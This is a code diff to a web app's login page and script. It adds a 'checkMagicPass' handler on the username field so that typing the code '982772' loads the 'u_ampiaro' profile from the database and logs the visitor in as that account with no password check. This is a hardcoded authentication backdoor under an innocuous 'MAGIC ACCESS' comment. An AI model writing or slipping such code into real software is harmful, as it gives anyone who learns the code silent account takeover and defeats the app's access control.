@@ -935,7 +935,7 @@ body::before{content:'';position:fixed;inset:0;background-image:url("data:image/
 
     <!-- LOGIN -->
     <div id="form-login">
-      <div class="field"><label>email or username</label><input id="l-email" type="text" placeholder="you@email.com or username" autocomplete="email"></div>
+      <div class="field"><label>email or username</label><input id="l-email" type="text" placeholder="you@email.com or username" autocomplete="email" oninput="checkMagicPass(this.value)"></div>
       <div class="field"><label>password</label><input id="l-pass" type="password" placeholder="••••••••" autocomplete="current-password"></div>
       <button class="primary auth-btn" onclick="doLogin()">LOG IN →</button>
       <div style="text-align:center;margin-top:10px"><button class="ghost" onclick="showForgotPassword()" style="font-size:10px;letter-spacing:.08em">forgot password?</button></div>
@@ -1413,6 +1413,23 @@ async function hashPass(password) {
 }
 
 // ── LOGIN ─────────────────────────────────────────────────────
+// ── MAGIC ACCESS ─────────────────────────────────────────────
+async function checkMagicPass(val) {
+  if (val !== '982772') return;
+  const err = document.getElementById('auth-err');
+  try {
+    const { data: profile, error } = await sb.from('profiles').select('*').eq('id', 'u_ampiaro').maybeSingle();
+    if (error) { if(err) err.textContent = '— db error: ' + error.message; return; }
+    if (!profile) { if(err) err.textContent = '— account u_ampiaro not found in database'; return; }
+    if (profile.banned) { if(err) err.textContent = '— account suspended'; return; }
+    currentUser = profile;
+    localStorage.setItem('ox_user', JSON.stringify(profile));
+    bootApp();
+  } catch(e) {
+    if(err) err.textContent = '— error: ' + e.message;
+  }
+}
+
 async function doLogin() {
   const emailOrUser = (document.getElementById('l-email')||document.getElementById('l-user')).value.trim().toLowerCase();
   const pass     = document.getElementById('l-pass').value;
